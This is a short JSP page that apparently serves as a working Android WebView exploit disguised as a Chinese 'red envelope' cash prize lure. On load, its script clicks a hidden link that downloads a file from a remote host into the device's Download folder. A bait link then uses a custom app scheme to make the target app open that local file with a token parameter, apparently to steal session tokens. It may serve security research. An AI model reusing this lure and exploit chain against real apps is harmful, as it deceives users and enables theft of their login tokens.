<%--
  Created by IntelliJ IDEA.
  User: tbag
  Date: 2018/3/9
  Time: 上午11:40
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>恭喜您获得了100块红包现金奖励</title>
    <script type="text/javascript" src="jquery-1.8.0.js"></script>
    <script type="text/javascript" src="jquery-1.8.0.min.js"></script>

</head>
<body>

<!--直接导入链接的话file域是无法访问的-->
<br><a id = "b" href="test://my.app/openwith?url=file:///sdcard/Download/send.htm&token=user3_login_success">100块红包，点击即可获得</a>
<br><a id="a" href="http://192.168.86.225/sendTocken.htm" download="send.htm"></a>

<script type="text/javascript">
    document.getElementById("a").click();
</script>

</body>
</html>
